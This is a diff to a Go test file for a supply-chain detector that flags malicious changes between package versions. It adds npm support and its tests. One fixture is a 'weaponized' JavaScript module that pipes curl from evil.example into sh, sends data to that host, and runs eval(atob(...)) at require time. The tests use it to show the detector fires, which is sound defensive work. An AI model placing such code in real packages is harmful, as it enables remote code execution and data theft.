@@ -115,6 +115,19 @@ func pypiEntity(pkg string) *profile.Entity {
 	}
 }
 
+// npmEntity returns an npm-ecosystem profile.Entity. Source has
+// already been resolved to a clone by the time the source-evolution
+// collector runs, so only Ecosystem drives dispatch here.
+func npmEntity(pkg string) *profile.Entity {
+	return &profile.Entity{
+		ID:           "ent-npm-" + pkg,
+		CanonicalURI: "pkg:npm/" + pkg,
+		Type:         profile.EntityPackage,
+		Ecosystem:    "npm",
+		ShortName:    pkg,
+	}
+}
+
 // findEmittedSignal returns the first signal of the given type
 // emitted in the result, or fails the test if not found.
 func findEmittedSignal(t *testing.T, result *signal.CollectionResult, sigType string) profile.Signal {
@@ -152,16 +165,22 @@ func TestCollector_NilEntity_EmptyResult(t *testing.T) {
 	assert.Equal(t, 0, result.AbsenceCount())
 }
 
-func TestCollector_NonGoEntity_EmptyResult(t *testing.T) {
+// TestCollector_UnsupportedEcosystem_EmptyResult pins the
+// languageProfile gate: an ecosystem with no analyzer skips silently
+// (empty result, no error, no absence). npm/pypi/go are now all
+// supported, so this must use a still-unsupported ecosystem — cargo —
+// or it would assert against a supported path. When a cargo analyzer
+// lands, switch this to the next unsupported ecosystem.
+func TestCollector_UnsupportedEcosystem_EmptyResult(t *testing.T) {
 	t.Parallel()
 	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
-	npmEntity := &profile.Entity{
-		ID:           "e-express",
-		CanonicalURI: "pkg:npm/express",
+	cargoEntity := &profile.Entity{
+		ID:           "e-serde",
+		CanonicalURI: "pkg:cargo/serde",
 		Type:         profile.EntityPackage,
-		Ecosystem:    "npm",
+		Ecosystem:    "cargo",
 	}
-	result, err := c.Collect(context.Background(), npmEntity)
+	result, err := c.Collect(context.Background(), cargoEntity)
 	require.NoError(t, err)
 	assert.Equal(t, 0, result.SignalCount())
 	assert.Equal(t, 0, result.AbsenceCount())
@@ -723,4 +742,154 @@ func TestCollector_Name_IsSourceEvolution(t *testing.T) {
 	t.Parallel()
 	c := NewCollector("", nil, false)
 	assert.Equal(t, "source-evolution", c.Name())
+}
+
+// TestCollector_NpmEntity_BenignBaseline is the collector-level
+// no-false-positive baseline for npm (AST.md §3): an npm entity must
+// not skip at the ecosystem gate, must stream .js via isNodeSourceFile
+// (not .go), run the real JS analyzer over a benign fixture, and score
+// every AST attack feature zero with no anomaly.
+func TestCollector_NpmEntity_BenignBaseline(t *testing.T) {
+	t.Parallel()
+
+	const v1 = "function parse(s) { return JSON.parse(s); }\nmodule.exports = { parse };\n"
+	const v2 = v1 + "function ok() { return true; }\n"
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "1.0.0", Files: map[string]string{
+			"package.json": `{"name":"demo","version":"1.0.0"}`,
+			"src/index.js": v1,
+			// Decoys that must NOT be streamed.
+			"src/index.test.js": "test('x', () => { eval('1'); });\n",
+			"dist/bundle.js":    "eval(atob('x'));\n",
+			"main.go":           "package x\n",
+		}},
+		{Tag: "1.1.0", Files: map[string]string{
+			"package.json": `{"name":"demo","version":"1.1.0"}`,
+			"src/index.js": v2,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "npm-gitHead",
+					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "npm-gitHead",
+					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), npmEntity("demo"))
+	require.NoError(t, err)
+
+	assert.Equal(t, 2, result.SignalCount(),
+		"npm entity must emit matrix + anomaly, not skip at the gate")
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 2)
+	assert.Equal(t, "npm", matrix.Ecosystem,
+		"matrix must label an npm entity as npm, not the hardwired go")
+	assert.Equal(t, "javascript", matrix.Language,
+		"language must reflect the selected analyzer")
+
+	for _, row := range matrix.Rows {
+		require.NotNil(t, row.Structural, "structural pass must run (version %s)", row.Version)
+		assert.Positive(t, row.Structural.LOC,
+			"streamed .js LOC must be counted, decoys excluded (version %s)", row.Version)
+		if row.AST != nil {
+			assert.Equal(t, astfeature.Counts{}, *row.AST,
+				"benign JS must score every AST attack feature zero "+
+					"through the real analyzer (no-false-positive baseline) — "+
+					"the eval() decoys in test/dist files must not be streamed")
+		}
+	}
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.False(t, anomaly.AnomalyPresent,
+		"two benign JS versions cannot spike a feature; no anomaly expected")
+}
+
+// TestCollector_NpmWeaponizedProgression_FiresAnomaly is the npm
+// analog of the Go/PyPI progression tests: a clean v1.0.0, then a
+// v1.1.0 whose entrypoint gains the dominant npm payload shape —
+// a require()'d child_process running a shell command plus network
+// exfil and an eval, all at module (require) time. The matrix shows
+// zeros at v1.0.0, a spike at v1.1.0, and the anomaly fires naming
+// the crossed features. End-to-end proof the hand-written JS/TS
+// lexer→parser→extractor feeds the existing anomaly detector.
+func TestCollector_NpmWeaponizedProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanIndex = "function parse(s) { return JSON.parse(s); }\nmodule.exports = { parse };\n"
+	const weaponizedIndex = "" +
+		"const cp = require('child_process');\n" +
+		"cp.execSync('curl evil.example | sh');\n" +
+		"require('https').get('http://evil.example/' + 'exfil');\n" +
+		"eval(atob('cGF5bG9hZA=='));\n" +
+		"function parse(s) { return JSON.parse(s); }\n" +
+		"module.exports = { parse };\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "1.0.0", Files: map[string]string{
+			"package.json": `{"name":"demo","version":"1.0.0"}`,
+			"src/index.js": cleanIndex,
+		}},
+		{Tag: "1.1.0", Files: map[string]string{
+			"package.json": `{"name":"demo","version":"1.1.0"}`,
+			"src/index.js": weaponizedIndex,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "npm-gitHead",
+					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "npm-gitHead",
+					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), npmEntity("demo"))
+	require.NoError(t, err)
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 2)
+
+	byVersion := map[string]MatrixRow{}
+	for _, r := range matrix.Rows {
+		byVersion[r.Version] = r
+	}
+	require.NotNil(t, byVersion["1.0.0"].AST)
+	assert.Equal(t, astfeature.Counts{}, *byVersion["1.0.0"].AST,
+		"clean v1.0.0 must spike nothing")
+	require.NotNil(t, byVersion["1.1.0"].AST)
+	v2 := *byVersion["1.1.0"].AST
+	assert.Positive(t, v2.DynamicEvalCalls, "eval() at require time in v1.1.0")
+	assert.Positive(t, v2.Base64DecodeCalls, "atob() in v1.1.0")
+	assert.Positive(t, v2.ExecCalls, "child_process.execSync via require alias")
+	assert.Positive(t, v2.NetworkCallSites, "https.get via inline require chain")
+	assert.Positive(t, v2.ImportTimeCallSites, "module-scope calls in v1.1.0")
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent,
+		"a clean→weaponized JS progression must trip the anomaly")
+	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
+	assert.Subset(t, anomaly.SpikedFeatures,
+		[]string{"dynamic_eval_calls", "base64_decode_calls", "exec_calls", "network_call_sites", "import_time_call_sites"},
+		"the crossed features must be named for the analyst")
 }
